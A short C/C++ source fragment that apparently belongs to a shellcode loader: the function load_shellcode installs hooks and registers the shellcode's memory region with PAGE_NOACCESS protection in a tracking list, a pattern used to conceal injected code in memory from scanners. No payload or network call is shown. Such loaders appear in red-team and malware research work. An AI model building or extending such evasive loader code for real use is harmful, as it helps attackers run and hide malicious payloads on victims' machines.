#include "Hook.hpp"
#include "connect.h"

#ifdef __cplusplus
extern "C" {
#endif 
	
	void load_shellcode(LPVOID lpShellcodeBase, SIZE_T shellcode_len) {
		HookingLoader();
		MEMHDR* first_mem = new MEMHDR;
		first_mem->oldprot = PAGE_NOACCESS;
		first_mem->size = shellcode_len;
		first_mem->addr = lpShellcodeBase;
		memlist.push_back(first_mem);
	}


#ifdef __cplusplus
}
#endif